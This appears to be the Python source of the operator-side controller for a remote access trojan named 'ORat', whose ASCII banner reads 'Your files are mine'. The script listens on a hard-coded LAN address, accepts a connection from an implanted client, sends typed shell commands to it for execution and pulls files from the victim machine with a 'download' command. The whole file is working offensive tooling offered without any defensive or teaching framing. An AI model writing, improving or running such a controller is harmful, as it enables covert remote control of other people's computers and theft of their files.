import socket
import threading
import multiprocessing
from colorama import init, Fore, Back, Style
from os import system
from time import sleep

system('mode con: cols=200 lines=40')
init()


connected = False
global connection
connection = False

print(r"""

                                                                                
                                                                                
     OOOOOOOOO     RRRRRRRRRRRRRRRRR                              tttt                 __             _,-"~^"-.
   OO:::::::::OO   R::::::::::::::::R                          ttt:::t               _// )      _,-"~`         `.
 OO:::::::::::::OO R::::::RRRRRR:::::R                         t:::::t             ." ( /`"-,-"`                 ;
O:::::::OOO:::::::ORR:::::R     R:::::R                        t:::::t            / 6                             ;
O::::::O   O::::::O  R::::R     R:::::R  aaaaaaaaaaaaa   ttttttt:::::ttttttt     /           ,             ,-"     ;
O:::::O     O:::::O  R::::R     R:::::R  a::::::::::::a  t:::::::::::::::::t    (,__.--.      \           /        ;
O:::::O     O:::::O  R::::RRRRRR:::::R   aaaaaaaaa:::::a t:::::::::::::::::t     //'   /`-.\   |          |        `._________
O:::::O     O:::::O  R:::::::::::::RR             a::::a tttttt:::::::tttttt       _.-'_/`  )  )--...,,,___\     \-----------,)
O:::::O     O:::::O  R::::RRRRRR:::::R     aaaaaaa:::::a       t:::::t           ((("~` _.-'.-'           __`-.   )         //
O:::::O     O:::::O  R::::R     R:::::R  aa::::::::::::a       t:::::t                 ((("`             (((---~"`         //
O:::::O     O:::::O  R::::R     R:::::R a::::aaaa::::::a       t:::::t                                                    ((________________
O::::::O   O::::::O  R::::R     R:::::Ra::::a    a:::::a       t:::::t    tttttt                                          `----\"\"\"\"~~~~^^^```
O:::::::OOO:::::::ORR:::::R     R:::::Ra::::a    a:::::a       t::::::tttt:::::t    
 OO:::::::::::::OO R::::::R     R:::::Ra:::::aaaa::::::a       tt::::::::::::::t
   OO:::::::::OO   R::::::R     R:::::R a::::::::::aa:::a        tt:::::::::::tt
     OOOOOOOOO     RRRRRRRR     RRRRRRR  aaaaaaaaaa  aaaa          ttttttttttt  
                                                                                
 __  __                       ____ _  __                                               _                    
\ \/ /____   __  __ _____   / __/(_)/ /___   _____   ____ _ _____ ___     ____ ___   (_)____   ___        
 \  // __ \ / / / // ___/  / /_ / // // _ \ / ___/  / __ `// ___// _ \   / __ `__ \ / // __ \ / _ \      
 / // /_/ // /_/ // /     / __// // //  __/(__  )  / /_/ // /   /  __/  / / / / / // // / / //  __/_   
/_/ \____/ \__,_//_/     /_/  /_//_/ \___//____/   \__,_//_/    \___/  /_/ /_/ /_//_//_/ /_/ \___/( )                                                                            
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                

""")


def connect():
    if connection != True:
        HOST = '192.168.0.29' # '192.168.43.82'
        PORT = 8081 # 2222
        server = socket.socket()
        server.bind((HOST, PORT))
        print(Fore.GREEN + '[+] Server Started')
        print(Fore.YELLOW + '[+] Listening For Client Connection ...')
        server.listen(1)
        global client
        client, client_addr = server.accept()
        print(Fore.GREEN + f"[+] {client_addr} Client connected to the server")
        output = client.recv(1024)
        output = output.decode()
        global header
        header = output
        cmdInput(client)

def cmdInput(client):
    global command
    command = input(Fore.GREEN + f"{header}~ ")
    if command == "":
        print(Fore.RED + "Please enter a command")
        sleep(3)
        cmdInput(client)

    elif command.split(" ")[0] == "download":        
        client.settimeout(10.0)

        file_name = command.split(" ")[1]
        command = command.encode()
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    print(Fore.GREEN + "Download Succesful!")
                    cmdInput(client)
    else:
        command = command.encode()
        client.send(command)
        cmdRecv()


def cmdRecv():
    client.settimeout(15.0)
    
    output = client.recv(8192)
    output = output.decode()
    print(Fore.WHITE + output)
    cmdInput(client)
    
    





connect()
